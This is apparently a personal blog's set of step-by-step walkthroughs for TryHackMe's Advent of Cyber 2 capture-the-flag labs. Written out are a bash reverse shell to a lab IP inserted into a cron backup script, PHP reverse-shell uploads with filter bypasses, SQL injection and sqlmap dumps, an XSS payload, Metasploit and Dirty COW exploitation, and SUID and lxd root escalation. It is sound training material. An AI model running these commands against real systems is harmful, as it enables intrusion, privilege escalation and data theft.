---
title: "Advent of Cyber 2"
tags: ['TryHackMe']
date: 2021-01-02
---

The first 23 days are simple bullet points describing how to do the task. Day 24 is a more complete write-up, as it was a more complete challenge!

## Table of Contents

- [[Day 1] Web Exploitation: A Christmas Crisis [encoding]](#day-1-web-exploitation-a-christmas-crisis-encoding)
- [[Day 2] Web Exploitation: The Elf Strikes Back! [file upload]](#day-2-web-exploitation-the-elf-strikes-back-file-upload)
- [[Day 3] Web Exploitation: Christmas Chaos [brute force]](#day-3-web-exploitation-christmas-chaos-brute-force)
- [[Day 4] Web Exploitation: Santas watching [brute force / fuzzing]](#day-4-web-exploitation-santa-s-watching-brute-force-fuzzing)
- [[Day 5] Web Exploitation: Someone stole Santas gift list! [SQLi]](#day-5-web-exploitation-someone-stole-santa-s-gift-list-sqli)
- [[Day 6] Web Exploitation: Be careful with what you wish on a Christmas night [XSS]](#day-6-web-exploitation-be-careful-with-what-you-wish-on-a-christmas-night-xss)
- [[Day 7] Networking: The Grinch Really Did Steal Christmas [pcap]](#day-7-networking-the-grinch-really-did-steal-christmas-pcap)
- [[Day 8] Networking: Whats Under the Christmas Tree? [nmap]](#day-8-networking-what-s-under-the-christmas-tree-nmap)
- [[Day 9] Networking: Anyone can be Santa! [ftp]](#day-9-networking-anyone-can-be-santa-ftp)
- [[Day 10] Networking: Dont be sElfish! [Samba]](#day-10-networking-don-t-be-selfish-samba)
- [[Day 11] Networking: The Rogue Gnome [SUID]](#day-11-networking-the-rogue-gnome-suid)
- [[Day 12] Networking: Ready, set, elf. [msf]](#day-12-networking-ready-set-elf-msf)
- [[Day 13] Special by John Hammond: Coal for Christmas [manual exploit]](#day-13-special-by-john-hammond-coal-for-christmas-manual-exploit)
- [[Day 14] Special by TheCyberMentor: Wheres Rudolph? [OSINT]](#day-14-special-by-thecybermentor-where-s-rudolph-osint)
- [[Day 15] Scripting: Theres a Python in my stocking! [Python]](#day-15-scripting-there-s-a-python-in-my-stocking-python)
- [[Day 16] Scripting: Help! Where is Santa?  [Python]](#day-16-scripting-help-where-is-santa-python)
- [[Day 17] Reverse Engineering: ReverseELFneering [RE x86]](#day-17-reverse-engineering-reverseelfneering-re-x86)
- [[Day 18] Reverse Engineering: The Bits of Christmas [RE .NET]](#day-18-reverse-engineering-the-bits-of-christmas-re-net)
- [[Day 19] Special by Tib3rius: The Naughty or Nice List [SSRF]](#day-19-special-by-tib3rius-the-naughty-or-nice-list-ssrf)
- [[Day 20] Blue Teaming: PowershELlF to the rescue [PowerShell]](#day-20-blue-teaming-powershellf-to-the-rescue-powershell)
- [[Day 21] Blue Teaming: Time for some ELForensics [strings, ADS, wmic]](#day-21-blue-teaming-time-for-some-elforensics-strings-ads-wmic)
- [[Day 22] Blue Teaming: Elf McEager becomes CyberElf [CyberChef]](#day-22-blue-teaming-elf-mceager-becomes-cyberelf-cyberchef)
- [[Day 23] Blue Teaming The Grinch strikes again! [vss]](#day-23-blue-teaming-the-grinch-strikes-again-vss)
- [[Day 24] Special by DarkStar The Trial Before Christmas [lots!]](#day-24-special-by-darkstar-the-trial-before-christmas-lots)

## [Day 1] Web Exploitation: A Christmas Crisis [encoding]

1. Register and log in
2. Check cookies
3. Decode using Cyberchef
    - All numbers and early-in-the-alphabet letters → hex
4. Recognise format
5. Adjust username and re-encode using Cyberchef
6. Replace cookie value and refresh page
7. Turn everything on → success!

## [Day 2] Web Exploitation: The Elf Strikes Back! [file upload]

1. Create exploit script as described
2. Go to URL including GET request
    - `http://<url>/?id=<id-token>`
3. Check source code for upload types
4. Rename script to bypass filter
    - `$ mv php-reverse-shell.php php-reverse-shell.jpg.php`
5. Upload file. Simple message "File received successfully!"
    1. Check Burp Suite history - the POST was to `/upload`, so perhaps `/uploads/`? Test: `http://10.10.35.237/uploads/` → success!
    2. Also checked page source, find `http://10.10.35.237/assets/js/upload.js`. It's obfuscated, but so use [https://beautifier.io/](https://beautifier.io/) and [http://jsnice.org/](http://jsnice.org/) to make sense of it. However, doesn't seem to give much.
    3. Hints suggest using a directory brute-forcer
6. Set up netcat listener: `$ sudo nc -lvnp 443`
7. Click file from `http://10.10.35.237/uploads/`, or visit full URL `http://10.10.35.237/uploads/php-reverse-shell.jpg.php`
8. Check netcat, find shell
9. `sh-4.4$ cat /var/www/flag.txt` → success!

## [Day 3] Web Exploitation: Christmas Chaos [brute force]

1. Follow instructions to use Burp Suite to crack
    1. Intercept login
    2. Send to Intruder
    3. Clust Bomb
    4. Set Payloads
    5. Attack
2. One result has different length returned → success!

## [Day 4] Web Exploitation: Santa's watching [brute force / fuzzing]

1. `wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`
2. `$ gobuster dir -u http://10.10.176.185/ -w /usr/share/wordlists/dirb/common.txt -x php`. Found `/api`, which led to `http://10.10.176.185/api/site-log.php` → success!
3. `$ wfuzz -c -z file,wordlist http://10.10.176.185/api/site-log.php?date=FUZZ` (wordlist downloaded from THM). Only one had any characters → success! 

## [Day 5] Web Exploitation: Someone stole Santa's gift list! [SQLi]

1. Find login page. Not `/login` or `/login.php`. Nothing in source. Check hint.
2. Attempt login using Burp Suite browser, find POST in HTTP history and send to Repeater, then save as `panel_login`.
3. `$ sqlmap -r panel_login --batch`
4. Meanwhile, try the obvious SQLi: `santa:' or 1=1 --` → success!
5. Try the same `' or 1=1 --` in the panel → success!
6. Same the gift database POST request (as above) as `gift_db`
7. `$ sqlmap -r gift_db --batch --dump` → success!

## [Day 6] Web Exploitation: Be careful with what you wish on a Christmas night [XSS]

1. Run manual test: Add wish of `<script>alert('xss');</script>`, refresh page, get alert box → XSS
2. Use ZAP Automated Scan as suggested

## [Day 7] Networking: The Grinch Really Did Steal Christmas [pcap]

1. `ICMP` to view pings
2. `http.request.method == GET` to view HTTP GETs
3. `frame contains password` to find the FTP cleartext password
4. Export objects to find the wishlist

## [Day 8] Networking: What's Under the Christmas Tree? [nmap]

1. `$ sudo nmap -A 10.10.27.82 -T4 -v` → success!

## [Day 9] Networking: Anyone can be Santa! [ftp]

1. `$ ftp 10.10.222.6` → anonymous
2. `ftp> ls -la` to view current directory contents
3. `ftp> cd public` then view current directory contents
4. `ftp> get shoppinglist.txt` to download the file, then view it with `$ cat`
5. `ftp> get backup.sh` then edit to include `bash -i >& /dev/tcp/10.4.5.126/4242 0>&1`
6. `$ nc -lvnp 4242` then wait for shell
7. `root@tbfc-ftp-01:~# cat /root/flag.txt` → success!

## [Day 10] Networking: Don't be sElfish! [Samba]

1. `$ enum4linux -a 10.10.122.80` to see what's available
2. `$ smbclient //10.10.122.80/tbfc-santa` to access share (no password)

## [Day 11] Networking: The Rogue Gnome [SUID]

1. `find / -perm -u=s -type f 2>/dev/null`
2. Transfer [LinEnum.sh](http://linenum.sh) and run

    `kali$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`

    `kali$ python3 -m http.server 4444`

    `bash-4.4$ wget 10.4.5.126:4444/LinEnum.sh`

    `bash-4.4$ chmod +x LinEnum.sh`

    `bash-4.4$ ./LinEnum.sh`

    > [+] Possibly interesting SUID files:
    -rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash

3. Check GTFOBins:
    1. For /bin/bash: https://gtfobins.github.io/gtfobins/bash/#file-read

        `bash-4.4$ export LFILE=/root/flag.txt; bash -c 'echo "$(<$LFILE)"'`

        `bash: /root/flag.txt: Permission denied`

    2. For /usr/bin/pkexec: [https://gtfobins.github.io/gtfobins/pkexec/](https://gtfobins.github.io/gtfobins/pkexec/)

        `bash-4.4$ pkexec /bin/sh`

        `==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===`

        `Authentication is needed to run '/bin/sh' as the super user`

        `Authenticating as: root`

        `Password:`

        `polkit-agent-helper-1: pam_authenticate failed: Authentication failure`

        `==== AUTHENTICATION FAILED ===`

        `Error executing command as another user: Not authorized`

4. Try something else:

    `bash-4.4$ bash -p` →

    `bash-4.4# cat /root/flag.txt` → success!

    (Actually related to https://gtfobins.github.io/gtfobins/bash/#suid but didn't need the first line)

## [Day 12] Networking: Ready, set, elf. [msf]

1. Find the web server

    `$ sudo nmap 10.10.30.25 -T4`

    `8080/tcp open  http-proxy`

2. Visit the web server: http://10.10.30.25:8080/ → Apache Tomcat/9.0.17
3. Find a vulnerability" Google "Apache Tomcat/9.0.17 cve" → [https://www.cvedetails.com/cve/CVE-2019-0232/](https://www.cvedetails.com/cve/CVE-2019-0232/)
4. Find an exploit and run it

    `$ msfconsole`

    `msf6 > search CVE-2019-0232`

    `msf6> use 0`

    `msf6> set RHOSTS 10.10.30.25`

    `msf6> set LHOST 10.4.5.126`

    `msf6> set TARGETURI /cgi-bin/elfwhacker.bat`

    `msf6> run`

5. Explore

    `meterpreter > cat flag1.txt` → success!

    `meterpreter > sysinfo` → x64 architecture, x86 meterpreter (tried below with x86, failed)

    `meterpreter > ps` to find x64 with 1 next to it

    `meterpreter > migrate 684` to migrate to x64 process

    `meterpreter > bg`

    `msf6> search suggest`

    `msf6> use 4`

    `msf6> set SESSION 1`

    `msf6> run`

    `[+] 10.10.30.25 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.` → but failed

    `msf6> sessions 1`

    `meterpreter > getsystem`

    `...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).` → success!

## [Day 13] Special by John Hammond: Coal for Christmas [manual exploit]

1. Find open ports: `$ sudo nmap -A -T4 -v -oA nmap 10.10.157.137`
2. Connect to telnet: `$ telnet 10.10.157.137`
3. Find more informoation: `$ cat /etc/*release` & `$ uname -a`
4. Read the file: `$ cat cookies_and_milk.txt`
5. Find correct dirty cow (based on /etc/passwd), `nano dirty.c`, then copy the script and save
[https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c](https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c)
6. Compile the code: `$ grep gcc dirty.c` → `$ gcc -pthread dirty.c -o dirty -lcrypt`
7. Run the exploit `$ ./dirty`
8. Change user `$ su firefart`
9. Move to root: `firefart@christmas:/home/santa# cd /root`
10. Read the message: `# cat message_from_the_grinch.txt`
11. Make file: `# touch coal`
12. Get MD5: `# tree | md5sum` → success!

## [Day 14] Special by TheCyberMentor: Where's Rudolph? [OSINT]

1. Google "IGuidetheClaus2020" with various additions
2. Reverse image search using [tineye.com](http://tineye.com) to find origin of image
3. Use `wget` to download image to avoid losing metadata
4. Get his email from Twitter and search [https://scyll4.com/api](https://scyll4.com/api) for `email:rudolphthered@hotmail.com` to find his password
5. Cross reference the co-ordinates with the Magnificent Mile on Google Maps and find a nearby hotel

## [Day 15] Scripting: There's a Python in my stocking! [Python]

1. `$ python3` then play!

## [Day 16] Scripting: Help! Where is Santa?  [Python]

1. Find the web server port: `$ sudo nmap -T4 10.10.238.68`
Was port 8000, now port 80. Also SSH on 22
2. Guess the obvious! Check source for hidden link.
3. Write Pyton script to automate → success!

    ```python
    import requests
    for key in range(11,100,2):
            url = f'http://10.10.12.81/api/{key}'
            r = requests.get(url)
            print(r.text)
    ```

## [Day 17] Reverse Engineering: ReverseELFneering [RE x86]

1. Log in to the machine: `$ ssh elfmceager@10.10.236.135`
2. Load the file into Radare2: `elfmceager@tbfc-day-17:~$ r2 -d challenge1`
3. Analyse: `[0x00400a30]> aa`
4. List functions: `[0x00400a30]> afl`
5. Disassemble main: `[0x00400a30]> pdf @main`
6. "Read" the code

## [Day 18] Reverse Engineering: The Bits of Christmas [RE .NET]

1. Log in with Remmina. Ensure color depth is set to RemoteFX (32 bpp) or it won't work.
2. Open TBFC_APP with ILSpy
3. Search for "password"
4. Open the app and log in

## [Day 19] Special by Tib3rius: The Naughty or Nice List [SSRF]

1. Follow instructions → success!

## [Day 20] Blue Teaming: PowershELlF to the rescue [PowerShell]

1. Log in via SSH: `$ ssh -l mceager 10.10.127.209`
2. Enter powershell: `mceager@ELFSTATION1 C:\Users\mceager>powershell`
3. Find and read the hidden file:

    `PS> Set-Location .\Documents\`

    `PS> Get-ChildItem -File -Hidden`

    `PS> Get-Content e1fone.txt`

4. Find and read the file:

    `PS> Set-Location ..\Desktop\`

    `PS> Get-ChildItem`

    `PS> et-Location elf2wo`

    `PS> Get-ChildItem`

    `PS> Get-Content e70smsW10Y4k.txt`

5. Find and read the files:

    `PS> Set-Location 'C:\Windows'`

    `PS> Get-ChildItem -Directory -Hidden -Recurse -ErrorAction SilentlyContinue`

    `PS> Set-Location .\System32\3lfthr3e`

    `PS> Get-ChildItem -Hidden`

    `PS> Get-Content .\1.txt | Measure-Object -Word`

    `PS> (Get-Content .\1.txt)[551]`

    `PS> (Get-Content .\1.txt)[6991]`

    `PS> Select-String -Path .\2.txt -Pattern "Ryder"`

## [Day 21] Blue Teaming: Time for some ELForensics [strings, ADS, wmic]

1. Connect with Remmina.
2. Read file.
3. Get hash: `PS> Get-FileHash -Algorithm MD5 .\deebee.exe`
4. Find flag: `PS> c:\Tools\strings64.exe -accepteula .\deebee.exe | findstr THM`
5. View alternate data streams (ADS) and stream names: `PS> Get-Item -Path .\deebee.exe -Stream *`
6. Launch the hidden executable hiding within ADS: `wmic process call create $(Resolve-Path .\deebee.exe:hidedb)`

## [Day 22] Blue Teaming: Elf McEager becomes CyberElf [CyberChef]

1. Connect with Remmina.
2. Decode folder name with CyberChef.
3. Log in to KeePass.
4. Find the passwords and decode with CyberChef.
5. The last one, `eval(String.fromCharCode( [..] ));`, is Javascript. Run it in a browser console and it links to a Github. Visit the page → success!

## [Day 23] Blue Teaming The Grinch strikes again! [vss]

1. Connect with Remmina.
2. Open file on desktop and user CyberChef to decode bitcoin address.
3. Browse for the encrypted files.
4. Open Task Scheduler to view scheduled tasks and hunt for a strange name.
5. Open Task Scheduler to view scheduled tasks and hunt for ShadowCopy.
6. Open Disk Management, assign drive letter to Disk 2, and view the drive. Make sure to turn on viewing hidden files if using Explorer.
7. Check the version history to read the password.

## [Day 24] Special by DarkStar The Trial Before Christmas [lots!]

Start by **portscanning** the box with nmap: `$ nmap -A -T4 -oA nmap 10.10.174.132`. We find two open ports. Using the Burp Suite integrated browser, visit the pages. The one with the higher port number leads us to a **login page**.

Trying to login with basic SQLi (e.g. `admin:' or 1=1--`) doesn't get us anywhere. We can register and log in, but it doesn't get us anything useful except an **incredibly entertaining video**.

Next let's try and find directories and files. The question mentions a php file, so use that as an extension. I like **Gobuster**: `$ gobuster dir -u http://10.10.174.132:65000 -w /usr/share/wordlists/dirb/common.txt -x php`

We find an **upload page**. By viewing the source, we can see the `<input>` only accepts certain file extensions. We can try using the same reverse shell php script as Day 2, renaming it to bypass the filter as before, although that gives us "**Invalid File Type**". Checking the HTTP history in Burp we see there was no POST request, being the check (and hence rejection) was client-side.

First let's see if there's a **magic number filter**. This is part of the file itself which tells a system what the type of file is. The magic number for a `.jpeg` is "FF D8 FF E0", and we can use hexeditor to change it: `$ hexeditor -b php-reverse-shell.jpg.php` → Ctrl-A four times to insert four empty bytes → replace with `FF D8 FF E0` → Ctrl-X to save as `php-reverse-shell-hex.jpg.php`. `$ file php-reverse-shell-hex.jpg.php` to test, and it returns `JPEG image data`.  More info here: . [https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/](https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/).

However, we still get "Invalid File Type".

Doing some more digging (by inspecting the page Sources in the browser), we see there is a **client-side JavaScript** file, filter.js, doing the client-side filtering. Reading the script, we can see it actually blocks all uploads! Meaning, if the script is loaded, every file will return "Invalid File Type". Muiri is such a troll.

Luckily we can tell Burp not to load the file when we load a page. Go to Proxy > Options > Incercept Client Requests and remove the `js` entry. Turn Intercept on, and hard-refresh the uploads page. **Drop filter.js** (forward everything else) in Burp, and then we can upload our reverse shell!

Gosbuter also found us another interesting-looking page. Visit it and we can see it is where the uploaded files are stored - we can see our reverse shell!  Set up a **netcat** listener on our machine with `$ sudo nc -lvnp 443` and then "open" the reverse shell script in the browser - it will hang and then time out, but our listening will **give us a shell**.

The default shell is rubbish, so we can upgrade it. Spawn a **better shell** with `$ python3 -c 'import pty;pty.spawn("/bin/bash")'`, then change the teminal emulator with `www-data@light-cycle:/$ export TERM=xterm`. Background the shell with Ctrl-Z, then run `$ stty raw -echo; fg` to stop cross-issues with our own terminal, then foreground the process again. Now we have a fully-functional reverse shell.

Find the **flag** file (we know the file name) with `www-data@light-cycle:/$ find / -name "web.txt" 2>/dev/null`, and then read it with `www-data@light-cycle:/$ cat /var/www/web.txt`.

Now we need to find the **web server conf files**. We can check the type of web server by seeing if the 404 page is generic e.g. [http://10.10.122.132:65000/jyhtgrfe](http://10.10.122.132:65000/jyhtgrfe). Turns out it's Apache/2.4.29. The Apache2 conf file is at `/etc/apache2/apache2.conf` (by default, according to Google), but that has nothing. The web server directory is `/var/www/` (again by default), and it contains a folder called `TheGrid`. Inside this folder, we find the video from earlier, the `public_html` (i.e. the website content) folder, and `includes`. This latter one contains several php scripts. Read them with `cat` and we find **one of them contains credentials**.

If we try to log in at the login page with those credentials, we get "Invalid username or password", so no luck there. The file with the credentials suggests it's a SQL database, so let's tru to access that with **MySQL**: `www-data@light-cycle:/$ mysql -utron -p`. We're in.

We can explore the database next:

`mysql> show databases;`
`mysql> use tron;`
`mysql> show tables;`
`mysql> SELECT * FROM users;`

Nice, we get a **username and hashed password**. The php file from before suggests it's MD5. This is easily cracked - I like [https://crackstation.net/](https://crackstation.net/).

We can log in to the login page with those credentials, but... again the video. But we can also **change the user from in shell**: `www-data@light-cycle:/$ su flynn`. Now we can get the next flag, which is in the usual CTF location: `flynn@light-cycle:~$ cat /home/flynn/user.txt`.

We can check which groups the user is in with `$ groups` or `$ id`, and we find **lxd** is one of them. We can exploit lxd for **privilege escalation** and get root. Full details are on the Advent of Cyber 2 page. For us all we need to do is:

`$ lxc image list`
`$ lxc init Alpine dletcont -c security.privileged=true` [`dletcont` is the container name]
`$ lxc config device add dletcont dletdev disk source=/ path=/mnt/root recursive=true` [`dletdev` is the device name]
`$ lxc start dletcont`
`$ lxc exec dletcont /bin/sh`

And we're **root**! This can be checked with `# id`.

Finally, change to the root folder with `# cd /mnt/root/root` then `# cat root.txt` for the **final flag**.